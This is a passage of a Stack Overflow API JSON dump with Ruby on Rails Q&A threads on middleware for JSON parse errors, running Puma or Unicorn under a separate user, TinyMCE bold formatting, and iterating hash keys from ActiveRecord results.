env['HTTP_ACCEPT']&amp;.match(/application\\/json/)\n\n      error_output = \"There was a problem in the JSON you submitted: #{error}\"\n      return [\n        400, { \"Content-Type\" =&gt; \"application/json\" },\n        [{ status: 400, error: error_output }.to_json]\n      ]\n    end\n  end\nend\n</code></pre>\n\n<p>In my <code>application.rb</code> file I have the following line:</p>\n\n<pre><code>config.middleware.insert_before(ActionDispatch::Http::Parameters, \"CatchJsonParseErrors\")\n</code></pre>\n\n<p>When I try to start my app It returns following error:</p>\n\n<pre><code>`assert_index': No such middleware to insert before: ActionDispatch::Http::Parameters (RuntimeError)\n</code></pre>\n\n<p>How can I fix that?</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "httpserver", "application-server"], "comments": [{"owner": {"reputation": 14827, "user_id": 645886, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2abb0123e9484284a9cb2d36aa9854b3?s=128&d=identicon&r=PG&f=1", "display_name": "Surya", "link": "https://stackoverflow.com/users/645886/surya"}, "edited": false, "score": 1, "creation_date": 1535363470, "post_id": 52036524, "comment_id": 91023530, "body": "You run your production server as your deploying username which is configured to have access to only the deployment directories, also set the environment variable from your deployment script(capistrano) so that your connection details aren&#39;t visible to anyone except the application."}, {"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1535363580, "post_id": 52036524, "comment_id": 91023595, "body": "Rails apps typically have a dedicated web server. It&#39;s unusual to have one web server run multiple Rails apps (which seems to be quite common in PHP land)."}, {"owner": {"reputation": 75558, "user_id": 544825, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/UFdOO.png?s=128&g=1", "display_name": "max", "link": "https://stackoverflow.com/users/544825/max"}, "edited": false, "score": 0, "creation_date": 1535363791, "post_id": 52036524, "comment_id": 91023697, "body": "Rails apps are usually deployed with an additional server layer such as nginx or apache passenger. Not Puma directly. Thats where you would handle the config."}, {"owner": {"reputation": 753, "user_id": 1826109, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/LsWmX.png?s=128&g=1", "display_name": "chingis", "link": "https://stackoverflow.com/users/1826109/chingis"}, "reply_to_user": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1535364585, "post_id": 52036524, "comment_id": 91024137, "body": "@Stefan I don&#39;t get how having another server in front changes anything, the user that runs application server still has full access to the codebase"}, {"owner": {"reputation": 753, "user_id": 1826109, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/LsWmX.png?s=128&g=1", "display_name": "chingis", "link": "https://stackoverflow.com/users/1826109/chingis"}, "reply_to_user": {"reputation": 14827, "user_id": 645886, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2abb0123e9484284a9cb2d36aa9854b3?s=128&d=identicon&r=PG&f=1", "display_name": "Surya", "link": "https://stackoverflow.com/users/645886/surya"}, "edited": false, "score": 0, "creation_date": 1535364612, "post_id": 52036524, "comment_id": 91024150, "body": "@Surya deployment directories? Do you mean like codebase?"}, {"owner": {"reputation": 753, "user_id": 1826109, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/LsWmX.png?s=128&g=1", "display_name": "chingis", "link": "https://stackoverflow.com/users/1826109/chingis"}, "reply_to_user": {"reputation": 75558, "user_id": 544825, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/UFdOO.png?s=128&g=1", "display_name": "max", "link": "https://stackoverflow.com/users/544825/max"}, "edited": false, "score": 0, "creation_date": 1535364670, "post_id": 52036524, "comment_id": 91024184, "body": "@max what config? The application server still has full access to codebase, how another http server upfront can change it?"}, {"owner": {"reputation": 75558, "user_id": 544825, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/UFdOO.png?s=128&g=1", "display_name": "max", "link": "https://stackoverflow.com/users/544825/max"}, "edited": false, "score": 0, "creation_date": 1535364866, "post_id": 52036524, "comment_id": 91024265, "body": "You can change which user is running the server via nginx or passenger. I don&#39;t get why you assume that the user has write privileges (well except /public if you want to do user uploads)."}, {"owner": {"reputation": 753, "user_id": 1826109, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/LsWmX.png?s=128&g=1", "display_name": "chingis", "link": "https://stackoverflow.com/users/1826109/chingis"}, "reply_to_user": {"reputation": 75558, "user_id": 544825, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/UFdOO.png?s=128&g=1", "display_name": "max", "link": "https://stackoverflow.com/users/544825/max"}, "edited": false, "score": 0, "creation_date": 1535365543, "post_id": 52036524, "comment_id": 91024636, "body": "@max my original question is about a user who owns codebase. Not sure how any configuration on the server (e.g. nginx) that proxies requests to application server can change the fact that I run puma from the codebase owner. I would love to run puma with sudo and specify user/group (e.g. www-data) for child processes like I do this with FPM but it just does not have these settings"}, {"owner": {"reputation": 753, "user_id": 1826109, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/LsWmX.png?s=128&g=1", "display_name": "chingis", "link": "https://stackoverflow.com/users/1826109/chingis"}, "reply_to_user": {"reputation": 75558, "user_id": 544825, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/UFdOO.png?s=128&g=1", "display_name": "max", "link": "https://stackoverflow.com/users/544825/max"}, "edited": false, "score": 0, "creation_date": 1535365815, "post_id": 52036524, "comment_id": 91024808, "body": "@max another example \u2013 unicorn has settings for user/group so I can run it with sudo and specify user/group (e.g. www-data) BUT if you run a rails app (latest stable version) it has a dependency on bootsnap gem that creates tmp/cache/bootsnap-* directories as root (in master process) which basically means it&#39;s not designed to run like that"}], "owner": {"reputation": 753, "user_id": 1826109, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/LsWmX.png?s=128&g=1", "display_name": "chingis", "link": "https://stackoverflow.com/users/1826109/chingis"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 47, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1535366607, "creation_date": 1535362836, "last_edit_date": 1535366607, "question_id": 52036524, "link": "https://stackoverflow.com/questions/52036524/is-it-safe-to-run-ruby-http-server-from-the-user-who-owns-codebase", "title": "Is it safe to run Ruby HTTP server from the user who owns codebase?", "body": "<p>For example, in PHP-based apps it's recommended to run PHP-FPM from a user different from the user who owns codebase so if anyone hacks your app from the web won't be able to write anything to a codebase (except public assets directory). It seems like ruby apps designed to run HTTP servers (or application/rake servers) like Unicorn and Puma from the same user. Puma (the default rails server) doesn't even have config entries for specifying a user/group. </p>\n\n<p><strong>UPDATE</strong></p>\n\n<p>What I expect to do with a ruby app (the same I do with PHP-FPM) is to run <code>sudo unicorn</code> or <code>sudo puma</code> from a default user (codebase owner) and specify a user/group (like <code>www-data</code>) in config so the HTTP server will run the master process from root and child processes from <code>www-data</code>. Puma has no such settings and I haven't found any related issues in puma's repo. This made me think that maybe it's a common thing in Ruby ecosystem to run it like that. I still tried to run latest rails app (5.2.1) with unicorn but faced another issue: rails has a dependency on bootsnap gem and when you run <code>sudo unicorn -c config.rb</code> it creates <code>tmp/cache/bootsnap-*</code> directories as root (in master process) which breaks everything because child processes running from <code>www-data</code> won't have access to it. That made me consider again that maybe I'm doing something wrong and it's ok to run ruby apps from codebase-owner although I see no arguments how it's different from running PHP-FPM.</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "tinymce", "tinymce-rails"], "comments": [{"owner": {"reputation": 107, "user_id": 6807622, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11676840a0756b0771decb53406ff33c?s=128&d=identicon&r=PG&f=1", "display_name": "Penny", "link": "https://stackoverflow.com/users/6807622/penny"}, "reply_to_user": {"reputation": 155803, "user_id": 314166, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/zL1re.jpg?s=128&g=1", "display_name": "sawa", "link": "https://stackoverflow.com/users/314166/sawa"}, "edited": false, "score": 0, "creation_date": 1535359548, "post_id": 52035155, "comment_id": 91021176, "body": "@sawa bold functionality is not working"}], "answers": [{"comments": [{"owner": {"reputation": 107, "user_id": 6807622, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11676840a0756b0771decb53406ff33c?s=128&d=identicon&r=PG&f=1", "display_name": "Penny", "link": "https://stackoverflow.com/users/6807622/penny"}, "edited": false, "score": 0, "creation_date": 1535365405, "post_id": 52036995, "comment_id": 91024562, "body": "at the backend even after it get saves the text is around &lt;strong&gt; tag but it doesnt show in that way"}, {"owner": {"reputation": 16077, "user_id": 319702, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/Rb5G2.jpg?s=128&g=1", "display_name": "sameera207", "link": "https://stackoverflow.com/users/319702/sameera207"}, "reply_to_user": {"reputation": 107, "user_id": 6807622, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11676840a0756b0771decb53406ff33c?s=128&d=identicon&r=PG&f=1", "display_name": "Penny", "link": "https://stackoverflow.com/users/6807622/penny"}, "edited": false, "score": 0, "creation_date": 1535366144, "post_id": 52036995, "comment_id": 91024983, "body": "@SushmaKv, when you show up the text, use <code>raw</code> method to show the html content. otherwise rails by default not showing the html , please note, only works in helpers and views by default -&gt; <a href=\"https://apidock.com/rails/ActionView/Helpers/RawOutputHelper/raw\" rel=\"nofollow noreferrer\">apidock.com/rails/ActionView/Helpers/RawOutputHelper/raw</a>"}, {"owner": {"reputation": 107, "user_id": 6807622, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11676840a0756b0771decb53406ff33c?s=128&d=identicon&r=PG&f=1", "display_name": "Penny", "link": "https://stackoverflow.com/users/6807622/penny"}, "edited": false, "score": 0, "creation_date": 1535366795, "post_id": 52036995, "comment_id": 91025358, "body": "i tried adding raw but its nt working the way it should"}, {"owner": {"reputation": 16077, "user_id": 319702, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/Rb5G2.jpg?s=128&g=1", "display_name": "sameera207", "link": "https://stackoverflow.com/users/319702/sameera207"}, "reply_to_user": {"reputation": 107, "user_id": 6807622, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11676840a0756b0771decb53406ff33c?s=128&d=identicon&r=PG&f=1", "display_name": "Penny", "link": "https://stackoverflow.com/users/6807622/penny"}, "edited": false, "score": 0, "creation_date": 1535369565, "post_id": 52036995, "comment_id": 91026953, "body": "can you update the question with the code where you expect the text to see as bold"}, {"owner": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "reply_to_user": {"reputation": 107, "user_id": 6807622, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11676840a0756b0771decb53406ff33c?s=128&d=identicon&r=PG&f=1", "display_name": "Penny", "link": "https://stackoverflow.com/users/6807622/penny"}, "edited": false, "score": 0, "creation_date": 1535387881, "post_id": 52036995, "comment_id": 91037998, "body": "@SushmaKv can you post the actual text that is saved in <code>course.description</code> as it appears in the database?"}], "tags": [], "owner": {"reputation": 16077, "user_id": 319702, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/Rb5G2.jpg?s=128&g=1", "display_name": "sameera207", "link": "https://stackoverflow.com/users/319702/sameera207"}, "is_accepted": false, "score": 1, "last_activity_date": 1535364466, "creation_date": 1535364466, "answer_id": 52036995, "question_id": 52035155, "link": "https://stackoverflow.com/questions/52035155/tinymce-bold-not-working-in-rails/52036995#52036995", "title": "TinyMCE bold not working in rails", "body": "<p>Normally all these wysiwyg editors format your input in to <code>html</code>, <code>markdown</code> etc under the hood and saves to the data base. </p>\n\n<p>If we consider html, when you make a text bold, for an example it maybe adding a <code>&lt;b&gt;&lt;/b&gt;</code> tag around your text.</p>\n\n<p>I can see you have the <a href=\"https://www.tiny.cloud/docs/plugins/code/\" rel=\"nofollow noreferrer\"><code>code</code></a> plugin in the list. As per the documentation of the plugin, it should allow you to view the html of your editing changes. </p>\n\n<p>As a test, </p>\n\n<ul>\n<li>Make a text bold in the editor</li>\n<li><p>Switch to <code>Source</code> view and see if your text is surrounded by bold tags. </p></li>\n<li><p>If <code>yes</code>, make sure you backend saves the same string in to the database. Make sure you dont have any code that strips out the html tags</p></li>\n<li><p>If <code>no</code>, then the editor is not converting your changes, you may have to check the editor configs. </p></li>\n</ul>\n"}], "owner": {"reputation": 107, "user_id": 6807622, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11676840a0756b0771decb53406ff33c?s=128&d=identicon&r=PG&f=1", "display_name": "Penny", "link": "https://stackoverflow.com/users/6807622/penny"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 409, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1535369977, "creation_date": 1535357630, "last_edit_date": 1535369977, "question_id": 52035155, "link": "https://stackoverflow.com/questions/52035155/tinymce-bold-not-working-in-rails", "title": "TinyMCE bold not working in rails", "body": "<p>I have used Tinymce editor in my rails app. When I try to make a text bold and save, the text changes are not reflected.</p>\n\n<p>Gemfile</p>\n\n<pre><code>gem 'tinymce-rails'\n</code></pre>\n\n<p>congig/tinymce.yml</p>\n\n<pre><code>selector: textarea.table-editor\ntheme: modern\nselector: textarea\ntoolbar: styleselect | bold italic | undo redo | table | alignleft \n         aligncenter alignright alignjustify | bullist numlist outdent indent | ink image | print preview media fullpage | forecolor backcolor | emoticons\nplugins:\n      - table \n      - advlist autolink link image lists charmap print preview hr anchor  pagebreak spellchecker\n      - searchreplace wordcount visualblocks visualchars code fullscreen insertdatetime media nonbreaking \n      - save table contextmenu directionality emoticons template paste textcolor \n</code></pre>\n\n<p>application.js</p>\n\n<pre><code> //= require tinymce\n</code></pre>\n\n<p>something.html.erb</p>\n\n<pre><code> &lt;%= tinymce_assets %&gt;\n &lt;%= tinymce %&gt;\n &lt;%= form.text_area :description, :class =&gt; \"tinymce\", id: :course_description %&gt; \n</code></pre>\n\n<p>show.html.erb</p>\n\n<pre><code> &lt;%= @course.description.html_safe %&gt;\n</code></pre>\n"}, {"tags": ["arrays", "ruby", "hash"], "comments": [{"owner": {"reputation": 21, "user_id": 10264147, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Coding ", "link": "https://stackoverflow.com/users/10264147/coding"}, "reply_to_user": {"reputation": 830, "user_id": 642496, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/182757c8d4baebc5eb960251d7b983f1?s=128&d=identicon&r=PG", "display_name": "hernanvicente", "link": "https://stackoverflow.com/users/642496/hernanvicente"}, "edited": false, "score": 0, "creation_date": 1535358004, "post_id": 52035053, "comment_id": 91020449, "body": "no my b array of hash is correct I am trying to create a new array into my new fromat. I am getting error for which I am trying."}, {"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 2, "creation_date": 1535358943, "post_id": 52035053, "comment_id": 91020875, "body": "<code>undefined method `each&#39; for</code> \u2013 there seem to be missing something after <code>for</code>"}, {"owner": {"reputation": 21, "user_id": 10264147, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Coding ", "link": "https://stackoverflow.com/users/10264147/coding"}, "reply_to_user": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1535359052, "post_id": 52035053, "comment_id": 91020926, "body": "I have just added the error. I have added one solution which I have tried I need answer to covert that array into a format which I am trying to get"}, {"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1535359565, "post_id": 52035053, "comment_id": 91021186, "body": "BTW, <code>2011-12: 17.6</code> is invalid syntax \u2013 a (unquoted) key must not contain <code>-</code>. Please fix your example code, so that it is runnable (e.g. use <code>&#39;2011-12&#39;: 17.6</code> or <code>&#39;2011-12&#39; =&gt; 17.6</code>). Otherwise it might seem as if the problem is due to a syntax error."}, {"owner": {"reputation": 830, "user_id": 642496, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/182757c8d4baebc5eb960251d7b983f1?s=128&d=identicon&r=PG", "display_name": "hernanvicente", "link": "https://stackoverflow.com/users/642496/hernanvicente"}, "edited": false, "score": 0, "creation_date": 1535360293, "post_id": 52035053, "comment_id": 91021555, "body": "Can you try to convert the result of your query to json? Check <a href=\"https://api.rubyonrails.org/classes/ActiveRecord/Result.html\" rel=\"nofollow noreferrer\">api.rubyonrails.org/classes/ActiveRecord/Result.html</a>"}, {"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1535360599, "post_id": 52035053, "comment_id": 91021749, "body": "Apparently <code>b</code> is an <code>ActiveRecord::Relation</code> instance, not an array. This means that <code>b.each</code> doesn&#39;t return hashes, but <code>ActiveRecord</code> instances, in your case <code>AnnualStateDomesticProduct3</code> instances."}, {"owner": {"reputation": 21, "user_id": 10264147, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Coding ", "link": "https://stackoverflow.com/users/10264147/coding"}, "edited": false, "score": 0, "creation_date": 1535361325, "post_id": 52035053, "comment_id": 91022171, "body": "Any solution for my question"}, {"owner": {"reputation": 1798, "user_id": 587238, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/957f31102fe690aca373f297176b9d18?s=128&d=identicon&r=PG", "display_name": "Peter Andersson", "link": "https://stackoverflow.com/users/587238/peter-andersson"}, "edited": false, "score": 0, "creation_date": 1535361672, "post_id": 52035053, "comment_id": 91022396, "body": "b.all.each do |col|   col.each do |key, value|     puts &quot;The hash key is #{key} and the value is #{value}.&quot;   end end"}, {"owner": {"reputation": 21, "user_id": 10264147, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Coding ", "link": "https://stackoverflow.com/users/10264147/coding"}, "edited": false, "score": 0, "creation_date": 1535361788, "post_id": 52035053, "comment_id": 91022454, "body": "Getting same error undefined each method"}, {"owner": {"reputation": 9663, "user_id": 5239030, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/76JEw.png?s=128&g=1", "display_name": "iGian", "link": "https://stackoverflow.com/users/5239030/igian"}, "edited": false, "score": 0, "creation_date": 1535377631, "post_id": 52035053, "comment_id": 91032148, "body": "Check if the edit to my answer can help solve your problem about the correct hash: <a href=\"https://stackoverflow.com/a/52036370/5239030\">stackoverflow.com/a/52036370/5239030</a>"}], "answers": [{"comments": [{"owner": {"reputation": 21, "user_id": 10264147, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Coding ", "link": "https://stackoverflow.com/users/10264147/coding"}, "edited": false, "score": 0, "creation_date": 1535359608, "post_id": 52035576, "comment_id": 91021208, "body": "Peter I am getting that value from my db where 2011-12 is my column name how to convert symbol into string."}, {"owner": {"reputation": 1798, "user_id": 587238, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/957f31102fe690aca373f297176b9d18?s=128&d=identicon&r=PG", "display_name": "Peter Andersson", "link": "https://stackoverflow.com/users/587238/peter-andersson"}, "reply_to_user": {"reputation": 21, "user_id": 10264147, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Coding ", "link": "https://stackoverflow.com/users/10264147/coding"}, "edited": false, "score": 0, "creation_date": 1535359762, "post_id": 52035576, "comment_id": 91021284, "body": "How exactly are you generating the &quot;b= ... &quot;  statement? Using Ruby or some other tool?"}, {"owner": {"reputation": 21, "user_id": 10264147, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Coding ", "link": "https://stackoverflow.com/users/10264147/coding"}, "edited": false, "score": 0, "creation_date": 1535359856, "post_id": 52035576, "comment_id": 91021322, "body": "I am getting that value using model.where(&#39;Sector = ? &#39;, rain_fall_type).order(&#39;id&#39;)"}, {"owner": {"reputation": 1798, "user_id": 587238, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/957f31102fe690aca373f297176b9d18?s=128&d=identicon&r=PG", "display_name": "Peter Andersson", "link": "https://stackoverflow.com/users/587238/peter-andersson"}, "reply_to_user": {"reputation": 21, "user_id": 10264147, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Coding ", "link": "https://stackoverflow.com/users/10264147/coding"}, "edited": false, "score": 0, "creation_date": 1535360023, "post_id": 52035576, "comment_id": 91021411, "body": "OK you are using Rails then.  I would suggest outputting the &quot;b&quot; variable using b.inspect. That way you can see it completely. Paste the output here pls."}, {"owner": {"reputation": 21, "user_id": 10264147, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Coding ", "link": "https://stackoverflow.com/users/10264147/coding"}, "edited": false, "score": 0, "creation_date": 1535360215, "post_id": 52035576, "comment_id": 91021504, "body": "Updated the question"}, {"owner": {"reputation": 1798, "user_id": 587238, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/957f31102fe690aca373f297176b9d18?s=128&d=identicon&r=PG", "display_name": "Peter Andersson", "link": "https://stackoverflow.com/users/587238/peter-andersson"}, "reply_to_user": {"reputation": 21, "user_id": 10264147, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Coding ", "link": "https://stackoverflow.com/users/10264147/coding"}, "edited": false, "score": 0, "creation_date": 1535360413, "post_id": 52035576, "comment_id": 91021619, "body": "really interesting! What is the datatype of the table column? Are you using MySQL or Sqlite?"}, {"owner": {"reputation": 21, "user_id": 10264147, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Coding ", "link": "https://stackoverflow.com/users/10264147/coding"}, "edited": false, "score": 0, "creation_date": 1535360487, "post_id": 52035576, "comment_id": 91021674, "body": "I am using mysql and data type is float for 2011-12"}, {"owner": {"reputation": 1798, "user_id": 587238, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/957f31102fe690aca373f297176b9d18?s=128&d=identicon&r=PG", "display_name": "Peter Andersson", "link": "https://stackoverflow.com/users/587238/peter-andersson"}, "reply_to_user": {"reputation": 21, "user_id": 10264147, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Coding ", "link": "https://stackoverflow.com/users/10264147/coding"}, "edited": false, "score": 0, "creation_date": 1535360708, "post_id": 52035576, "comment_id": 91021822, "body": "I think your problem would go away if you renamed the column to &quot;X2011-12&quot; (or whatever syntax you choose as long as it doesnt start with a number). However I can&#39;t find any proof for this. It&#39;s just a hunch."}, {"owner": {"reputation": 1798, "user_id": 587238, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/957f31102fe690aca373f297176b9d18?s=128&d=identicon&r=PG", "display_name": "Peter Andersson", "link": "https://stackoverflow.com/users/587238/peter-andersson"}, "reply_to_user": {"reputation": 21, "user_id": 10264147, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Coding ", "link": "https://stackoverflow.com/users/10264147/coding"}, "edited": false, "score": 0, "creation_date": 1535360894, "post_id": 52035576, "comment_id": 91021936, "body": "OK I see an error now in your question, b since b is a Relation, it&#39;s not an array. You must call .all or .first to get the table row."}, {"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 1, "creation_date": 1535361449, "post_id": 52035576, "comment_id": 91022257, "body": "@PeterAndersson being an ORM, ActiveRecord doesn&#39;t return raw table rows, it returns objects."}, {"owner": {"reputation": 1798, "user_id": 587238, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/957f31102fe690aca373f297176b9d18?s=128&d=identicon&r=PG", "display_name": "Peter Andersson", "link": "https://stackoverflow.com/users/587238/peter-andersson"}, "edited": false, "score": 0, "creation_date": 1535361625, "post_id": 52035576, "comment_id": 91022373, "body": "I thought that was what I said. This is Rails excellent Lazy Loading technique."}], "tags": [], "owner": {"reputation": 1798, "user_id": 587238, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/957f31102fe690aca373f297176b9d18?s=128&d=identicon&r=PG", "display_name": "Peter Andersson", "link": "https://stackoverflow.com/users/587238/peter-andersson"}, "is_accepted": false, "score": 0, "last_activity_date": 1535359452, "creation_date": 1535359452, "answer_id": 52035576, "question_id": 52035053, "link": "https://stackoverflow.com/questions/52035053/find-key-and-value-in-hash/52035576#52035576", "title": "Find key and value in hash", "body": "<p>as hermanvicente says, 2011-12 is not a valid hash key (it's an expression). Must be quoted as a string.</p>\n\n<pre><code>b = [\n  {\n    id: 2,\n    \"Sector\": \"Crops\",\n    \"2011-12\": 17.6,\n    \"2012-13\": 18.9,\n    \"2013-14\": 14.2\n  }\n]\n\nb.each do |col|\n  col.each do |key, value|\n    puts \"The hash key is #{key} and the value is #{value}.\"\n  end\nend\n</code></pre>\n\n<p>prints</p>\n\n<pre><code>The hash key is id and the value is 2.\nThe hash key is Sector and the value is Crops.\nThe hash key is 2011-12 and the value is 17.6.\nThe hash key is 2012-13 and the value is 18.9.\nThe hash key is 2013-14 and the value is 14.2.\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "edited": false, "score": 0, "creation_date": 1535373260, "post_id": 52036370, "comment_id": 91029333, "body": "It is an array of hashes and not a single hash."}], "tags": [], "owner": {"reputation": 9663, "user_id": 5239030, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/76JEw.png?s=128&g=1", "display_name": "iGian", "link": "https://stackoverflow.com/users/5239030/igian"}, "is_accepted": false, "score": 0, "last_activity_date": 1535377894, "last_edit_date": 1535377894, "creation_date": 1535362338, "answer_id": 52036370, "question_id": 52035053, "link": "https://stackoverflow.com/questions/52035053/find-key-and-value-in-hash/52036370#52036370", "title": "Find key and value in hash", "body": "<p>Given the following hash (not the array, note the quotes wrapping the keys, as pointed).</p>\n\n<pre><code>h = {\n      id: 2,\n      Sector: \"Crops\",\n      \"2011-12\": 17.6,\n      \"2012-13\": 18.9,\n      \"2013-14\": 14.2,\n      \"2014-15\": 13.1,\n      \"2015-16\": 12.3,\n      \"2016-17\": 12.1,\n      created_at: \"2018-08-27T06:11:29.000Z\",\n      updated_at: \"2018-08-27T06:11:29.000Z\"\n    }\n</code></pre>\n\n<p>This is one way you can get the required result.</p>\n\n<pre><code>h.delete_if { |k,v| [:id, :Sector, :created_at, :updated_at].include? k }\n.each_with_object([]) { |pair, ary| ary &lt;&lt; { y: pair.last, label: 